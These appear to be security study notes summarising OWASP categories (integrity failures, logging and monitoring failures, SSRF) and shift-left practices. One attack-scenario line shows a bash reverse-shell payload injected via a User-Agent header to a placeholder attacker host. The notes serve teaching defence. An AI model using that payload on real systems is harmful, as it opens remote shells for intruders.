
Software and Data Integrity Failures
- Refer to the lack of provenance and whether a software or data artefact has been tampered since its original creation

Software and Data Integrity Failures Typical Vuln
- Insufficient verification of data origin and authenticity
- Missing support for integrity check

Software and Data Integrity Failures Prevention
- Use digital signatures to verify the source and integrity of software and data artefacts
- Use integrity checks/signatures when sending serialised data to untrusted clients

Security Logging and Monitoring Failures
- Relates to the lack of logging, especially application logging, securing the logs against tampering and crucially the lack of log monitoring

Security Logging and Monitoring Failures Typical Vuln
- Lack of logs for security related events. E.g. No logging of user authentication failures prevents detection of brute-force password
- No integrity mechanisms in place allow an attacker to cover their tracks

Security Logging and Monitoring Failures Attack Scenario
- An attacker inserts malicious code into a log file entry by manipulating user input to a web application
- Injects the code into the user agent string: `User-Agent: Mozilla/5.0; /bin/bash -i >& /dev/tcp/attacker_ip/443 0>&1`

Security Logging and Monitoring Failures Attack Scenario
- Ensure all security related events (login success & failures, access control changes) are logged
- Establish a documented, tested incident response plan/playbook

Server-Side Request Forgery
- An attack vector that exploits an application to interact with the internal/external network or the machine itself

Server-Side Request Forgery Typical Vuln
- Failed web server request validation
- Poor internal network segmentation to restrict lateral movement

Server-Side Request Forgery Prevention
- Enable authentication to all internal systems
- Deploy whitelists of DNS/IP addresses that an application is allowed to access


Shift Left Security
- Incorporating security requirements, security design and security testing earlier in the Software Development Lifecycle (SDLC).

Goals of Shift Left Security
- Identify security design flaws & vulnerabilities as early as possible in the development lifecycle.
- Ensure secure design principles are applied during the design phase

Shift Left Security Common Practices
- Security Policy
- Threat Modelling
- Secure Coding Practices

Shift Left Security - Separation of Privilege
- For highly sensitive operations, split responsibilities between two or more people
- No single person has complete control; requires collusion to exploit